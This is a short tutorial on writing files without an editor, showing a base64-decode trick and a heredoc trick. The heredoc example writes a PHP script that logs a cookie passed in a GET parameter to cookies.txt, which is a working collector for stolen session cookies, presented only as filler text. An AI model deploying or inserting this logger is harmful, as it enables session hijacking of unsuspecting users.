# No nano, no problem!!!

Have you ever wondered how to paste your code or any text into a file when nano, vim, or other tools aren't available? Here are a few tricks to do it without any hassle. All you need is write permission on the file, and you're all set!

## Base64 Trick:

Write a code:

```
# a simple for loop
start = 1
end = 100

for number in range(start, end + 1):
    print(number)
```
convert it into base64 format using any availble tool online:

```
IyBhIHNpbXBsZSBmb3IgbG9vcApzdGFydCA9IDEKZW5kID0gMTAwCgpmb3IgbnVtYmVyIGluIHJhbmdlKHN0YXJ0LCBlbmQgKyAxKToKICAgIHByaW50KG51bWJlcik=
```

echo it into a file:

```
echo '{paste base64 encoding here}' | base64 -d > loop.py
```

You will see that the contents are pasted as is inside the file.


## EOF based Trick:

```
$ cat > example.txt << EOF
> <?php
> $cookie = $_GET['c'];
> $fp = fopen('cookies.txt', 'a+');
> fwrite($fp, 'Cookie:' .$cookie."\r\n");
> fclose($fp);
> ?>
> EOF
```

## Author:
**Purva Patel**

